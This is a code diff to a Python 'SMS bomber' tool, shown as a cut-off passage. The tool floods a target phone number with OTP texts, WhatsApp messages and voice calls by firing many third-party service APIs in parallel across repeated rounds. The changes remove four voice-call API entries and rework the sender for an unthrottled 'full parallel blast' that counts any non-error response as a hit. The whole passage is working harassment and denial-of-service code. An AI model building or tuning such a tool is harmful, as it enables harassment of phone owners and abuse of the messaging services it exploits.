@@ -355,103 +355,64 @@ API_CONFIGS = [
         "data": lambda p: f"check_mobile_number=1&contact={p}",
         "type": "SMS",
     },
-    {
-        "name": "MSG91 CALL",
-        "url": "https://control.msg91.com/api/v5/widget/callWidget",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "authkey": "YOUR_MSG91_AUTHKEY",
-            "User-Agent": "Mozilla/5.0",
-        },
-        "data": lambda p: f'{{"mobile":"91{p}","template_id":"YOUR_MSG91_TEMPLATE_ID"}}',
-        "type": "CALL",
-    },
-    {
-        "name": "Fast2SMS CALL",
-        "url": "https://www.fast2sms.com/dev/voice",
-        "method": "POST",
-        "headers": {
-            "authorization": "YOUR_FAST2SMS_API_KEY",
-            "Content-Type": "application/json",
-        },
-        "data": lambda p: f'{{"variables_values":"1234","route":"v3","numbers":"{p}"}}',
-        "type": "CALL",
-    },
-    {
-        "name": "Twilio CALL",
-        "url": "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Calls.json",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "Basic YOUR_BASE64_CREDENTIALS",
-        },
-        "data": lambda p: f"To=%2B91{p}&From=%2B1YOUR_TWILIO_NUMBER&Twiml=%3CResponse%3E%3CSay%3EYour+OTP+is+1+2+3+4+5+6%3C%2FSay%3E%3C%2FResponse%3E",
-        "type": "CALL",
-    },
-    {
-        "name": "Exotel CALL",
-        "url": "https://api.exotel.com/v1/Accounts/YOUR_SID/Calls.json",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "Basic YOUR_EXOTEL_BASE64",
-        },
-        "data": lambda p: f"From=YOUR_EXOTEL_NUMBER&To=0{p}&CallerId=YOUR_CALLER_ID&Url=http://my.exotel.com/YOUR_SID/exoml/start_voice/YOUR_APP_ID",
-        "type": "CALL",
-    },
 ]
 
 
-async def _call(session, cfg, phone):
+async def _fire(session: aiohttp.ClientSession, cfg: dict, phone: str):
+    """Fire one API — returns (name, type, fired:bool)"""
     try:
-        url = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
+        url  = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
         data = cfg["data"](phone) if cfg["data"] else None
-        h = {k: (v(data) if callable(v) else v) for k, v in cfg["headers"].items()}
-        to = aiohttp.ClientTimeout(total=1.5, connect=0.8, sock_read=0.8)
+        h    = {k: (v(data) if callable(v) else v) for k, v in cfg["headers"].items()}
+        to   = aiohttp.ClientTimeout(total=3.0, connect=1.0, sock_read=2.0)
+
         if cfg["method"] == "GET":
             async with session.get(url, headers=h, timeout=to) as r:
-                return cfg["type"], r.status, (await r.text())[:200]
+                # ANY 2xx or 3xx = fired — don't filter on body text
+                return cfg["name"], cfg["type"], r.status < 400
         else:
             async with session.post(url, headers=h, data=data, timeout=to) as r:
-                return cfg["type"], r.status, (await r.text())[:200]
-    except Exception as e:
-        return cfg["type"], None, str(e)[:80]
+                return cfg["name"], cfg["type"], r.status < 400
+    except Exception:
+        return cfg["name"], cfg["type"], False
 
 
 async def run_bomber(phone: str, mode: str = "ALL", rounds: int = 1) -> dict:
+    """
+    Fire all APIs in pool × rounds, fully parallel across rounds.
+    Returns {sms, wa, call, total, fired, rps}
+    """
     pool = (
         API_CONFIGS if mode == "ALL"
         else [c for c in API_CONFIGS if c["type"] == mode]
     )
+
     connector = aiohttp.TCPConnector(
-        limit=600, limit_per_host=200,
-        ttl_dns_cache=300, force_close=False,
+        limit=0,                  # unlimited — let gather control concurrency
+        limit_per_host=50,
+        ttl_dns_cache=300,
+        force_close=False,
         enable_cleanup_closed=True,
     )
-    sms_ok = wa_ok = call_ok = total = 0
-    kw = ["success", "sent", "otp", "ok", "true", "1"]
+
+    sms_fired = wa_fired = call_fired = 0
+    total_fired = 0
     start = time.time()
+
     async with aiohttp.ClientSession(connector=connector) as session:
-        for _ in range(rounds):
-            results = await asyncio.gather(
-                *[_call(session, cfg, phone) for cfg in pool],
-                return_exceptions=True,
-            )
-            for res in results:
-                if isinstance(res, Exception):
-                    continue
-                typ, status, text = res
-                total += 1
-                if status and status < 400 and any(k in text.lower() for k in kw):
-                    if typ == "SMS":    sms_ok += 1
-                    elif typ == "WA":   wa_ok += 1
-                    elif typ == "CALL": call_ok += 1
-    elapsed = time.time() - start
-    return {
-        "sms": sms_ok,
-        "wa": wa_ok,
-        "call": call_ok,
-        "total": total,
-        "rps": round(total / elapsed, 2) if elapsed else 0,
-    }
+        # build ALL tasks upfront: pool × rounds — full parallel blast
+        all_tasks = [
+            _fire(session, cfg, phone)
+            for _ in range(rounds)
+            for cfg in pool
+        ]
+
+        results = await asyncio.gather(*all_tasks, return_exceptions=True)
+
+        for res in results:
+            if isinstance(res, Exception):
+                continue
+            name, typ, fired = res
+            if fired:
+                total_fired += 1
+                if typ == "SMS":    sms_fired += 1
